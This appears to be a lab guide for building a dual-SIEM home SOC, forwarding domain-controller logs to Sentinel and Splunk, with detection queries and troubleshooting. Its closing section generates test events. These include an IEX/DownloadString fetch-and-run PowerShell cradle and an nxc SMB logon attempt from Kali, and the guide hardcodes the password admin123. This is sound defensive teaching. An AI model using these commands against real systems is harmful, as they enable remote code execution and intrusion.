# Dual-SIEM Lab Setup Guide

## Azure Arc Onboarding (DC01)

### Prerequisites

- Azure subscription with sufficient credits
- DC01 has internet connectivity (via NAT interface)
- PowerShell 7+ on DC01
- Global Administrator or equivalent Azure permissions

### Step 1: Generate Arc Registration Script

1. Sign in to [Azure Portal](https://portal.azure.com)
2. Navigate to **Azure Arc** → **Servers** → **+ Add**
3. Select **Add servers with Azure Arc**
4. Choose **Generate script**
5. Select:
   - **Resource Group:** (e.g., `soc-lab`)
   - **Region:** (e.g., `East US`)
   - **Operating System:** Windows

6. Copy the generated PowerShell script

### Step 2: Run Script on DC01

```powershell
# From DC01 (PowerShell as Administrator)
cd $env:TEMP
Invoke-WebRequest -Uri "https://aka.ms/dependencyagentwindows" -OutFile InstallDependencyAgent-Windows.exe

# Paste the generated script and run
# Script will:
# - Install Azure Connected Machine Agent
# - Register with Azure Arc
# - Install dependency monitoring agent
```

**Validation:**

```powershell
# Check service status
Get-Service "himds" | Format-Table
# Status should be "Running"
```

### Step 3: Create Data Collection Rule (DCR)

1. In Azure Portal, navigate to **Monitor** → **Data Collection Rules** → **Create**
2. Set up:

   | Field | Value |
   |---|---|
   | Name | DCR-SOC-LAB-WINDOWS |
   | Resource Group | soc-lab |
   | Region | East US |

3. **Resources:** Select DC01 from Arc servers
4. **Collect and deliver:**
   - **Data source type:** Windows Event Logs
   - **Add event logs:**
     - Security (collect all events)
     - System (collect all events)
     - Application (collect all events)
   - **Destination:** Log Analytics workspace
   - **Account:** Managed Identity

5. **Review + Create**

---

## Splunk Installation & Configuration

### Step 1: Install Splunk Enterprise (SPLUNK-01)

```bash
# On SPLUNK-01 (Ubuntu Server)
# Download Splunk Enterprise for Linux
wget https://www.splunk.com/bin/splunk/download?file=Splunk-9.0.1-Linux-x86_64.tgz

# Extract
tar xzf Splunk-9.0.1-Linux-x86_64.tgz -C /opt/

# Start Splunk
/opt/splunk/bin/splunk start --accept-license --answer-yes --no-prompt --seed-passwd admin123

# Set to start on boot
/opt/splunk/bin/splunk enable boot-start -auth admin:admin123

# Verify
curl http://127.0.0.1:8000/
```

### Step 2: Configure Receiver (Listening Port)

```bash
# SSH to SPLUNK-01 and create inputs.conf
sudo nano /opt/splunk/etc/apps/search/local/inputs.conf
```

**Add:**

```ini
[splunktcp-ssl:1137]
disabled = false
source = dc01
sourcetype = windows:event
```

**Restart Splunk:**

```bash
/opt/splunk/bin/splunk restart
```

### Step 3: Create Indexes

From Splunk Web UI (http://192.168.70.80:8000):

1. **Settings** → **Indexes** → **New Index**

Create three indexes:

```
Index Name: windows
Datatype: Event
Max KB/day: Unlimited

Index Name: powershell
Datatype: Event
Max KB/day: Unlimited

Index Name: sysmon
Datatype: Event
Max KB/day: Unlimited
```

---

## Splunk Universal Forwarder Installation (DC01)

### Step 1: Download & Install UF

```powershell
# On DC01, download UF
$url = "https://www.splunk.com/bin/splunk/download?file=splunkuniversalforwarder-9.0.1-Windows-x64.msi"
Invoke-WebRequest -Uri $url -OutFile $env:TEMP\splunk-uf.msi

# Install
Start-Process -FilePath msiexec.exe -ArgumentList "/i $env:TEMP\splunk-uf.msi /quiet RECEIVING_INDEXER=`"192.168.70.80:1137`" WINEVENTLOG_SEC_MONITOR=1 WINEVENTLOG_SYS_MONITOR=1 WINEVENTLOG_APP_MONITOR=1" -Wait
```

### Step 2: Configure Forwarder Outputs

```powershell
# Edit outputs.conf on DC01
$ufPath = "C:\Program Files\SplunkUniversalForwarder\etc\apps\SplunkUniversalForwarder\local"

# Create outputs.conf
@"
[tcpout]
defaultGroup = lab_indexers
forwardedindex.0.whitelist = (.*)
forwardedindex.1.blacklist = (_.*|source::.*)
forwardedindex.2.whitelist = (_eventlog_system, _eventlog_security, _eventlog_application, _eventlog_powershell)

[tcpout:lab_indexers]
server = 192.168.70.80:1137
"@ | Out-File "$ufPath\outputs.conf" -Encoding UTF8
```

### Step 3: Configure Event Log Inputs

```powershell
# Create inputs.conf
$inputsPath = "$ufPath\inputs.conf"

@"
[WinEventLog://Security]
disabled = 0
index = windows
renderXml = true
sourcetype = WinEventLog:Security

[WinEventLog://System]
disabled = 0
index = windows
renderXml = true
sourcetype = WinEventLog:System

[WinEventLog://Application]
disabled = 0
index = windows
renderXml = true
sourcetype = WinEventLog:Application

[WinEventLog://Microsoft-Windows-PowerShell/Operational]
disabled = 0
index = powershell
renderXml = true
sourcetype = WinEventLog:PowerShell

[WinEventLog://Microsoft-Windows-Sysmon/Operational]
disabled = 0
index = sysmon
renderXml = true
sourcetype = WinEventLog:Sysmon
"@ | Out-File $inputsPath -Encoding UTF8
```

### Step 4: Restart Forwarder

```powershell
Restart-Service SplunkForwarder
```

---

## Validation Queries

### Microsoft Sentinel (KQL)

**Failed Logons (4625):**

```kusto
Event
| where EventID == 4625
| extend SourceIP = tostring(parse_json(EventData).IpAddress)
| extend Account = tostring(parse_json(EventData).TargetUserName)
| summarize Count = count() by SourceIP, Account, TimeGenerated
| sort by TimeGenerated desc
```

**SMB Activity:**

```kusto
Event
| where EventID in (5144, 5145, 4656, 4663)
| extend ObjectName = tostring(parse_json(EventData).ObjectName)
| extend SourceIP = tostring(parse_json(EventData).IpAddress)
| sort by TimeGenerated desc
```

**PowerShell Script Blocks:**

```kusto
Event
| where EventID == 4104
| extend ScriptContent = tostring(parse_json(EventData).ScriptBlockText)
| where ScriptContent contains "DownloadString" or ScriptContent contains "IEX"
| sort by TimeGenerated desc
```

### Splunk Enterprise (SPL)

**Failed Logons (EventCode 4625):**

```spl
index=windows EventCode=4625
| stats count by IpAddress, TargetUserName, ComputerName
| sort - count
```

**Logon Timeline:**

```spl
index=windows EventCode=4625
| timechart count by TargetUserName limit=5
```

**PowerShell Suspicious Activity:**

```spl
index=powershell EventCode=4104
| search ScriptBlockText IN ("DownloadString", "IEX", "Invoke-Expression", "WebClient")
| table _time, Computer, ScriptBlockText
| sort - _time
```

**Data Volume by Source:**

```spl
index=windows
| stats count by host, source, sourcetype
| sort - count
```

---

## Troubleshooting

### Splunk Forwarder Not Connecting

```powershell
# On DC01, check connectivity
Test-NetConnection 192.168.70.80 -Port 1137

# Check forwarder logs
Get-Content "C:\Program Files\SplunkUniversalForwarder\var\log\splunk\splunkd.log" -Tail 50

# Verify service is running
Get-Service SplunkForwarder
```

### No Data in Splunk

1. Verify inputs.conf is in the correct path:
   ```powershell
   Test-Path "C:\Program Files\SplunkUniversalForwarder\etc\apps\SplunkUniversalForwarder\local\inputs.conf"
   ```

2. Check receiver is listening:
   ```bash
   # On SPLUNK-01
   sudo netstat -tuln | grep 1137
   ```

3. Restart both services:
   ```powershell
   # On DC01
   Restart-Service SplunkForwarder
   
   # On SPLUNK-01
   sudo /opt/splunk/bin/splunk restart
   ```

### Data Not Appearing in Sentinel

1. Verify Arc agent status:
   ```powershell
   # On DC01
   Get-Service himds
   ```

2. Check Azure Monitor Agent logs:
   ```
   C:\ProgramData\GuestConfig\extension_logs\Microsoft.Azure.Monitor.AzureMonitorWindowsAgent
   ```

3. Validate DCR in Azure Portal:
   - Monitor → Data Collection Rules → DCR-SOC-LAB-WINDOWS
   - Check "Logs" section for ingestion status

---

## Generating Attack Events for Testing

### Failed Authentication (4625)

```bash
# From KALI01
nxc smb 192.168.70.20 -u Administrator -p 'WrongPassword' 2>&1 | head -5
```

### Successful Logon (4624)

```bash
# From DC01 itself
runas /user:DC01\testuser "cmd.exe"
```

### PowerShell Script Block (4104)

```powershell
# On DC01
powershell -Command "Write-Host 'Testing'; IEX(New-Object Net.WebClient).DownloadString('http://example.com')"
```

---

<div align="center">

**Questions?** Check the main [README.md](./README.md) or the [SOC-Lab](https://github.com/Dylans7j/SOC-Lab) repo.

</div>
